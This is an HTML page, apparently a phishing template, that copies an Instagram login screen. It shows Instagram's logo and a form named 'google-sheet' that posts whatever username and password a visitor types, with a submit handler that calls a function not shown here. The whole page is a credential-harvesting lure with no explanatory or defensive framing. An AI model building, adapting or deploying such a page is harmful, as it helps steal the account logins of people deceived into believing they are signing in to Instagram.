<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial, Helvetica, sans-serif;}
form {border: 3px solid #f1f1f1;}

input[type=text], input[type=password] {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

input[type="submit"] {
  background-color: skyblue;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
}
h5{
  text-align: center;
}
div .facbook{
  text-align: center;
}
div .Forget{
  text-align: center;

}

.cancelbtn {
  width: auto;
  padding: 10px 18px;
  background-color: #f44336;
}

.imgcontainer {
  text-align: center;
  margin: 24px 0 12px 0;
}

img.avatar {
  width: 70%;
  border-radius: 25%;
}

.container {
  padding: 50px;
  text-align: left;
}

span.psw {
  float: right;
  padding-top: 16px;
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 300px) {
  span.psw {
     display: block;
     float: none;
  }
  .cancelbtn {
     width: 100%;
  }
}
</style>
</head>

<div align="center">
 <div class="imgcontainer">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png" alt="Avatar" class="avatar">
  </div>

  <div class="container">
    <div>
  <form method="post" name="google-sheet">
    <label for="Username">Username</label>
    <input type="text" id="fname" name="Username" placeholder="Username">

     <label for="Password">Password</label>
    <input type="Password" id="lname" name="Password" placeholder="Password">
    
  <input type="submit" value="Submit" name="submit" onClick="myFunction()"/ >




    </form>
</div>
  </div>

</tr>
</table>
</div>
